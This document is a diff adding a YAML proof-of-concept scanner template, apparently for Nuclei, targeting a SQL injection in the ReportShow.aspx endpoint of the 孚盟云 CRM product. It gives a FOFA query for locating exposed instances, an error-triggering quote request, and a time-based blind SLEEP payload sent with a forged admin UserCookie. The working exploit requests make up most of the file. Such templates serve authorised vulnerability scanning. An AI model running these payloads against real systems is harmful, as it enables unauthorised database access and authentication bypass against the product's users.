@@ -1,0 +1,47 @@
+id: poc-yaml-fumasoft-reportshow-aspx-sqli
+info:
+  name: 孚盟云 ReportShow.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 孚盟云
+    fofa: app="孚盟软件-孚盟云"
+
+variables:
+  t1: '{{rand_int(3,8)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/ActiveReport/ReportShow.aspx?templateId=' HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "your SQL syntax"
+
+  - raw:
+      - |
+        GET /m/Dingding/ActiveReport/ReportShow.aspx?templateId=1%27+AND+(SELECT+*+FROM+(SELECT+SLEEP({{t1}}))x)--+ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"admin","corpId":"1","loginUser":"admin"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "导出PDF"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
